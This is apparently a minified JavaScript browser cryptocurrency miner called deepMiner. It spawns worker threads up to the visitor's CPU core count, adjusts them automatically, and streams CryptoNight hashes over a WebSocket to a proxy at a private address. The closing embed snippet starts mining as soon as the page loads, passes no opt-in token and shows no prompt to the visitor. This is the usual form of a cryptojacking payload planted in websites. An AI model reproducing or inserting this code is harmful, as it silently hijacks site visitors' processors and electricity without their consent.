(function(t){"use strict";var e=function(e,s){if(this.params=s||{},this._userID=e,this._threads=[],this._hashes=0,this._currentJob=null,this._autoReconnect=!0,this._reconnectRetry=3,this._totalHashesFromDeadThreads=0,this._throttle=Math.max(0,Math.min(.99,this.params.throttle||0)),this._stopOnInvalidOptIn=!1,this._selfTestSuccess=!1,this._verifyThread=null,this._autoThreads={enabled:!!this.params.autoThreads,interval:null,adjustAt:null,adjustEvery:1e4,stats:{}},this._tab={ident:16777215*Math.random()|0,mode:deepMiner.IF_EXCLUSIVE_TAB,grace:0,waitReconnect:0,lastPingReceived:0,interval:null},t.BroadcastChannel)try{this._bc=new BroadcastChannel("deepMiner"),this._bc.onmessage=function(t){"ping"===t.data&&(this._tab.lastPingReceived=Date.now())}.bind(this)}catch(t){}this._eventListeners={open:[],close:[],error:[],job:[],found:[],accepted:[]};var i=navigator.hardwareConcurrency||4;this._targetNumThreads=this.params.threads||i,this._useWASM=this.hasWASMSupport()&&!this.params.forceASMJS,this._asmjsStatus="unloaded",this._onTargetMetBound=this._onTargetMet.bind(this)};e.prototype.start=function(t,e){this._tab.mode=t||deepMiner.IF_EXCLUSIVE_TAB,this._optInToken=e,this._tab.interval&&(clearInterval(this._tab.interval),this._tab.interval=null),this._loadWorkerSource(function(){this._startNow()}.bind(this))},e.prototype.stop=function(t){for(var e=0;e<this._threads.length;e++)this._totalHashesFromDeadThreads+=this._threads[e].hashesTotal,this._threads[e].stop();this._threads=[],this._autoReconnect=!1,this._socket&&this._socket.close(),this._currentJob=null,this._autoThreads.interval&&(clearInterval(this._autoThreads.interval),this._autoThreads.interval=null),this._tab.interval&&"dontKillTabUpdate"!==t&&(clearInterval(this._tab.interval),this._tab.interval=null)},e.prototype.getHashesPerSecond=function(){for(var t=0,e=0;e<this._threads.length;e++)t+=this._threads[e].hashesPerSecond;return t},e.prototype.getTotalHashes=function(t){for(var e=Date.now(),s=this._totalHashesFromDeadThreads,i=0;i<this._threads.length;i++){var r=this._threads[i];if(s+=r.hashesTotal,t){var n=(e-r.lastMessageTimestamp)/1e3*.9;s+=n*r.hashesPerSecond}}return 0|s},e.prototype.getAcceptedHashes=function(){return this._hashes},e.prototype.on=function(t,e){this._eventListeners[t]&&this._eventListeners[t].push(e)},e.prototype.getAutoThreadsEnabled=function(t){return this._autoThreads.enabled},e.prototype.setAutoThreadsEnabled=function(t){this._autoThreads.enabled=!!t,!t&&this._autoThreads.interval&&(clearInterval(this._autoThreads.interval),this._autoThreads.interval=null),t&&!this._autoThreads.interval&&(this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery,this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3))},e.prototype.getThrottle=function(){return this._throttle},e.prototype.setThrottle=function(t){this._throttle=Math.max(0,Math.min(.99,t)),this._currentJob&&this._setJob(this._currentJob)},e.prototype.getNumThreads=function(){return this._targetNumThreads},e.prototype.setNumThreads=function(t){var e;if(t=Math.max(1,0|t),this._targetNumThreads=t,t>this._threads.length)for(var s=0;t>this._threads.length;s++)e=new deepMiner.JobThread,this._currentJob&&e.setJob(this._currentJob,this._onTargetMetBound),this._threads.push(e);else if(t<this._threads.length)for(;t<this._threads.length;)e=this._threads.pop(),this._totalHashesFromDeadThreads+=e.hashesTotal,e.stop()},e.prototype.hasWASMSupport=function(){return void 0!==t.WebAssembly&&!/OS 11_2_(2|5|6)/.test(navigator.userAgent)},e.prototype.isRunning=function(){return this._threads.length>0},e.prototype.isMobile=function(){return/mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)},e.prototype.selfTest=function(t){this._loadWorkerSource(function(){this._verifyThread||(this._verifyThread=new deepMiner.JobThread);var e={verify_id:"1",nonce:"d6220000",result:"d9e71cd5254c037f7c2086605ac0efce2d4931209acaab2a12b4ecd458140700",blob:"0707d8fc9edd052719a45c5acda4401a7fac4ba02dfec5305b1307a824826e8025e83e76bcc1e400000000359f05eabd2ff0c616709c64d560640ba8657b034042ce593d5c2c008a093d6e06"};this._verifyThread.verify(e,function(e){t(e.verified===!0,e)})}.bind(this))},e.prototype._loadWorkerSource=function(t){if(this._useWASM||"loaded"===this._asmjsStatus)t();else if("unloaded"===this._asmjsStatus){this._asmjsStatus="pending";var e=new XMLHttpRequest;e.addEventListener("load",function(){deepMiner.CRYPTONIGHT_WORKER_BLOB=deepMiner.Res(e.responseText),this._asmjsStatus="loaded",t()}.bind(this),e),e.open("get",deepMiner.CONFIG.LIB_URL+deepMiner.CONFIG.ASMJS_NAME,!0),e.send()}},e.prototype._startNow=function(){this._tab.mode===deepMiner.FORCE_MULTI_TAB||this._tab.interval||(this._tab.interval=setInterval(this._updateTabs.bind(this),1e3)),this._tab.mode===deepMiner.IF_EXCLUSIVE_TAB&&this._otherTabRunning()||(this._tab.mode===deepMiner.FORCE_EXCLUSIVE_TAB&&(this._tab.grace=Date.now()+3e3),this._verifyThread||(this._verifyThread=new deepMiner.JobThread),this.setNumThreads(this._targetNumThreads),this._autoReconnect=!0,this._connectAfterSelfTest())},e.prototype._otherTabRunning=function(){if(this._tab.lastPingReceived>Date.now()-1500)return!0;try{var t=localStorage.getItem("deepMiner");if(t){var e=JSON.parse(t);if(e.ident!==this._tab.ident&&Date.now()-e.time<1500)return!0}}catch(t){}return!1},e.prototype._updateTabs=function(){if(!(Date.now()<this._tab.waitReconnect)){var t=this._otherTabRunning();t&&this.isRunning()&&Date.now()>this._tab.grace?this.stop("dontKillTabUpdate"):t||this.isRunning()||this._startNow()}},e.prototype._adjustThreads=function(){var t=this.getHashesPerSecond(),e=this.getNumThreads(),s=this._autoThreads.stats;if(s[e]=s[e]?.5*s[e]+.5*t:t,Date.now()>this._autoThreads.adjustAt){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;var i=(s[e]||0)-1,r=s[e+1]||0,n=s[e-1]||0;if(i>n&&(0===r||r>i)&&e<8)return this.setNumThreads(e+1);if(i>r&&(!n||n>i)&&e>1)return this.setNumThreads(e-1)}},e.prototype._emit=function(t,e){var s=this._eventListeners[t];if(s&&s.length)for(var i=0;i<s.length;i++)s[i](e)},e.prototype._hashString=function(t){for(var e=5381,s=t.length;s;)e=33*e^t.charCodeAt(--s);return e>>>0},e.prototype._connectAfterSelfTest=function(){this._selfTestSuccess&&this.hasWASMSupport()?this._connect():this.selfTest(function(t){t?(this._selfTestSuccess=!0,this._connect()):this._emit("error",{error:"self_test_failed"})}.bind(this))},e.prototype._connect=function(){if(!this._socket){var t=deepMiner.CONFIG.WEBSOCKET_SHARDS,e=Math.random()*t.length|0,s=t[e],i=s[Math.random()*s.length|0];this._socket=new WebSocket(i),this._socket.onmessage=this._onMessage.bind(this),this._socket.onerror=this._onError.bind(this),this._socket.onclose=this._onClose.bind(this),this._socket.onopen=this._onOpen.bind(this)}},e.prototype._onOpen=function(){this._emit("open");var t={version:deepMiner.VERSION,userID:this._userID};this._send("auth",t)},e.prototype._onError=function(t){this._emit("error",{error:"connection_error"}),this._onClose(t)},e.prototype._onClose=function(t){t.code>=1003&&t.code<=1009&&(this._reconnectRetry=60,this._tab.waitReconnect=Date.now()+6e4);for(var e=0;e<this._threads.length;e++)this._threads[e].stop();this._threads=[],this._socket=null,this._emit("close"),this._autoReconnect&&setTimeout(this._startNow.bind(this),1e3*this._reconnectRetry)},e.prototype._onMessage=function(t){var e=JSON.parse(t.data);if("job"===e.type)this._setJob(e.params),this._emit("job",e.params),this._autoThreads.enabled&&!this._autoThreads.interval&&(this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery,this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3));else if("hash_accepted"===e.type)this._hashes=e.params.hashes,this._emit("accepted",e.params),this._goal&&this._hashes>=this._goal&&this.stop();else if("authed"===e.type)this._tokenFromServer=e.params.token||null,this._hashes=e.params.hashes||0,this._emit("authed",e.params),this._reconnectRetry=3,this._tab.waitReconnect=0;else if("error"===e.type)if(console&&console.error&&console.error("deepMiner Error:",e.params.error),this._emit("error",e.params),"invalid_userID"===e.params.error)this._reconnectRetry=6e3,this._tab.waitReconnect=Date.now()+6e6;else if("invalid_opt_in"===e.params.error){if(this._stopOnInvalidOptIn)return this.stop();this._auth&&this._auth.reset()}("banned"===e.type||e.params.banned)&&(this._emit("error",{banned:!0}),this._reconnectRetry=600,this._tab.waitReconnect=Date.now()+6e5)},e.prototype._setJob=function(t){this._currentJob=t,this._currentJob.throttle=this._throttle;for(var e=0;e<this._threads.length;e++)this._threads[e].setJob(t,this._onTargetMetBound)},e.prototype._onTargetMet=function(t){this._emit("found",t),t.job_id===this._currentJob.job_id&&this._send("submit",{version:deepMiner.VERSION,job_id:t.job_id,nonce:t.nonce,result:t.result})},e.prototype._send=function(t,e){if(this._socket){var s={type:t,params:e||{}};this._socket.send(JSON.stringify(s))}},t.deepMiner=t.deepMiner||{},t.deepMiner.VERSION=7,t.deepMiner.IF_EXCLUSIVE_TAB="ifExclusiveTab",t.deepMiner.FORCE_EXCLUSIVE_TAB="forceExclusiveTab",t.deepMiner.FORCE_MULTI_TAB="forceMultiTab",t.deepMiner.DOMAIN=document.location.origin.split("/").pop()||null,t.deepMiner.Init=function(t,s){t=t||deepMiner.DOMAIN||"deepMiner";var i=new e(t,s);return i},t.deepMiner.Res=function(e){var s=t.URL||t.webkitURL||t.mozURL;return s.createObjectURL(new Blob([e]))}})(window),function(t){"use strict";var e=function(){this.worker=new Worker(deepMiner.CRYPTONIGHT_WORKER_BLOB),this.worker.onmessage=this.onReady.bind(this),this.currentJob=null,this.verifyJob=null,this.jobCallback=function(){},this.verifyCallback=function(){},this._isReady=!1,this.hashesPerSecond=0,this.hashesTotal=0,this.running=!1,this.lastMessageTimestamp=Date.now()};e.prototype.onReady=function(t){if("ready"!==t.data||this._isReady)throw'Expecting first message to be "ready", got '+t;this._isReady=!0,this.worker.onmessage=this.onReceiveMsg.bind(this),this.currentJob?(this.running=!0,this.worker.postMessage(this.currentJob)):this.verifyJob&&this.worker.postMessage(this.verifyJob)},e.prototype.onReceiveMsg=function(t){return t.data.verify_id?void this.verifyCallback(t.data):(t.data.result&&this.jobCallback(t.data),this.hashesPerSecond=.5*this.hashesPerSecond+.5*t.data.hashesPerSecond,this.hashesTotal+=t.data.hashes,this.lastMessageTimestamp=Date.now(),void(this.running&&this.worker.postMessage(this.currentJob)))},e.prototype.setJob=function(t,e){this.currentJob=t,this.jobCallback=e,this._isReady&&!this.running&&(this.running=!0,this.worker.postMessage(this.currentJob))},e.prototype.verify=function(t,e){this.verifyCallback=e,this._isReady?this.worker.postMessage(t):this.verifyJob=t},e.prototype.stop=function(){this.worker&&(this.worker.terminate(),this.worker=null),this.running=!1},t.deepMiner.JobThread=e}(window),self.deepMiner=self.deepMiner||{},self.deepMiner.protocol="https:"===document.location.protocol?"s":"",self.deepMiner.CONFIG={LIB_URL:"http"+deepMiner.protocol+"://192.168.1.7/lib/",ASMJS_NAME:"",WEBSOCKET_SHARDS:[["ws"+deepMiner.protocol+"://192.168.1.7/proxy"]],MINER_URL:"http"+deepMiner.protocol+"://192.168.1.7/miner.html"},deepMiner.CRYPTONIGHT_WORKER_BLOB=deepMiner.CONFIG.LIB_URL+"cryptonight.js";
		var userID = 'deepMiner_wasm';
		var miner = new deepMiner.Init(userID, {
			autoThreads: true
		});
		miner.start();